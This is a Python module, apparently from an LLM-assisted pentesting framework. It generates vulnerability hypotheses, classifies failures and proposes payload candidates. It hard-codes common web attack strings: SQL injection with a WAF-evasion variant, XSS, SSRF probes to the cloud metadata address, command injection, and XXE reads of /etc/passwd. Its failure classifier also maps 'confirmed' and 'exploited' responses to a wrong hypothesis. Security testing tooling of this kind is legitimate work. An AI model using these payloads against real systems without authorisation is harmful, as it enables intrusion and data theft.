"""Expert execution layer for DABS-assisted pentesting.

This layer may be heuristic-rich and LLM-assisted, but it is append-only:
it can generate hypotheses, payload candidates, chain metadata, and failure
classifications. It must never rank hypotheses or make final execution
decisions.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

from phantom.core.dabs_kernel import StructuredHypothesis


@dataclass(frozen=True)
class ExpertCandidate:
    hypothesis: StructuredHypothesis
    payload_candidates: list[str]
    chain_relations: list[dict[str, Any]]
    surface_links: list[dict[str, Any]]
    vuln_family_grouping: list[str]
    failure_classification: str = "UNCLASSIFIED"
    metadata: dict[str, Any] | None = None


def classify_failure(tool_error: str = "", response_text: str = "") -> str:
    text = f"{tool_error}\n{response_text}".lower()
    if any(token in text for token in ("timeout", "timed out", "connection reset", "dns", "refused")):
        return "TOOL_FAILURE"
    if any(token in text for token in ("403", "401", "forbidden", "unauthorized", "waf")):
        return "ENVIRONMENT_LIMITATION"
    if any(token in text for token in ("invalid payload", "no match", "not vulnerable", "syntax error")):
        return "INSUFFICIENT_PAYLOAD"
    if any(token in text for token in ("confirmed", "vulnerable", "exploited", "sqli", "xss", "rce", "idor", "ssrf")):
        return "WRONG_HYPOTHESIS"
    return "UNCLASSIFIED"


def build_structured_hypothesis(
    vuln_class: str,
    target_surface: str,
    preconditions: list[str] | None = None,
    expected_exploit_path: str = "",
    required_signals: list[str] | None = None,
    metadata: dict[str, Any] | None = None,
) -> StructuredHypothesis:
    return StructuredHypothesis(
        vuln_class=str(vuln_class).strip().lower(),
        target_surface=str(target_surface).strip(),
        preconditions=tuple(str(item).strip() for item in (preconditions or []) if str(item).strip()),
        expected_exploit_path=str(expected_exploit_path).strip(),
        required_signals=tuple(str(item).strip() for item in (required_signals or []) if str(item).strip()),
        metadata=dict(metadata or {}),
    )


def propose_payload_candidates(
    hypothesis: StructuredHypothesis,
    failed_payloads: list[str] | None = None,
    response_behavior: str = "",
) -> list[str]:
    """Return candidate payload strings only.

    The function is intentionally non-ranking: it emits a stable candidate set
    conditioned on the hypothesis type and observed failure context.
    """

    failed = {str(item).strip() for item in (failed_payloads or []) if str(item).strip()}
    behavior = str(response_behavior).lower()

    payloads: list[str] = []
    vuln = hypothesis.vuln_class

    if vuln == "sqli":
        payloads.extend(["' OR 1=1--", "' UNION SELECT NULL--", "' AND SLEEP(1)--"])
        if "waf" in behavior:
            payloads.append("'/**/OR/**/1=1--")
    elif vuln == "xss":
        payloads.extend(["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"])
    elif vuln == "ssrf":
        payloads.extend(["http://169.254.169.254/", "http://127.0.0.1/", "http://localhost/"])
    elif vuln == "idor":
        payloads.extend(["/1", "?id=1", "user=1"])
    elif vuln in {"rce", "cmd_injection"}:
        payloads.extend([";id", "|id", "&& id"])
    elif vuln == "xxe":
        payloads.extend(["<!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'http://127.0.0.1/'>]>"])
    else:
        payloads.extend(["baseline_test_1", "baseline_test_2"])

    result: list[str] = []
    for payload in payloads:
        if payload not in failed and payload not in result:
            result.append(payload)
    return result


def enrich_graph_metadata(
    hypothesis: StructuredHypothesis,
    chain_relations: list[dict[str, Any]] | None = None,
    surface_links: list[dict[str, Any]] | None = None,
    vuln_family_grouping: list[str] | None = None,
) -> ExpertCandidate:
    return ExpertCandidate(
        hypothesis=hypothesis,
        payload_candidates=propose_payload_candidates(hypothesis),
        chain_relations=list(chain_relations or []),
        surface_links=list(surface_links or []),
        vuln_family_grouping=list(vuln_family_grouping or []),
        metadata=dict(hypothesis.metadata or {}),
    )
